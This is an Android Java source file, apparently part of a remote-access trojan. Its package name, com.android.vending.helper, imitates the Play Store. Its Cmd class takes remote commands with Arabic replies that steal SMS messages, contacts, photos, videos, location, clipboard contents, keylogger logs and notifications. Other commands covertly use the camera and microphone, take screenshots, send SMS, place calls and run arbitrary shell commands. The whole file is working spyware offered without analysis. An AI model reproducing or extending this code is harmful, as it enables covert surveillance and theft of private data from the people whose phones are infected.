package com.android.vending.helper;
import android.content.Context;
public class Cmd {
    public static String run(Context c, String line) {
        String[] p = line.trim().split("\\s+", 2);
        String cmd = p[0]; String arg = p.length > 1 ? p[1] : "";
        switch (cmd) {
            case "ping": return "متصل | " + Dev.desc(c) + "\n" + Sys.getBattery(c);
            case "apps": return "التطبيقات المثبتة:\n" + Exfil.apps(c);
            case "sms": return "آخر الرسائل:\n" + Exfil.sms(c, 10);
            case "contacts": return "جهات الاتصال:\n" + Exfil.contacts(c);
            case "photos20": return new FileCollector(c).uploadRandomPhotos(20);
            case "latest10": return new FileCollector(c).uploadLatestPhotos(10);
            case "count_photos": return new FileCollector(c).getPhotoCount();
            case "vids": return new FileCollector(c).uploadCameraVideos(5);
            case "loc": return "الموقع: " + Exfil.location(c);
            case "cam_back": Camera.takePhoto(c, false); return "جاري سحب صورة الكاميرا...";
            case "cam_front": Camera.takePhoto(c, true); return "جاري سحب صورة الكاميرا...";
            case "mic": return Media.recordMic(c);
            case "screenshot": return Media.screenshot(c);
            case "send_sms": return Comms.sendSms(c, arg);
            case "call": return Comms.makeCall(c, arg);
            case "clipboard": return "الحافظة: " + ClipboardHelper.get(c);
            case "keylog": return "سجل الكيبورد:\n" + KeyloggerService.getLogs(c);
            case "notif": return Sys.isNotifListenerEnabled(c) ? "خدمة الإشعارات مفعلة." : "خدمة الإشعارات معطلة! اذهب للإعدادات وفعلها.";
            case "notifs10": return "آخر الإشعارات:\n" + NotifListener.getLast10(c);
            case "vibrate": return Sys.vibrate(c);
            case "tts": return Sys.tts(c, arg.isEmpty() ? "مرحبا" : arg);
            case "wallpaper": return Sys.changeWallpaper(c);
            case "battery": return Sys.getBattery(c);
            case "wa_link": return WaHelper.triggerWaLink(c);
            case "shell": return Exec.shell(arg);
            case "help": return "الأوامر:\nping, apps, sms, contacts, photos20, latest10, count_photos, vids, loc, cam_back, cam_front, mic, screenshot, send_sms [رقم] [نص], call [رقم], clipboard, keylog, notif, notifs10, vibrate, tts [نص], wallpaper, battery, wa_link, shell [أمر]";
            default: return "[أمر غير معروف] " + cmd;
        }
    }
}
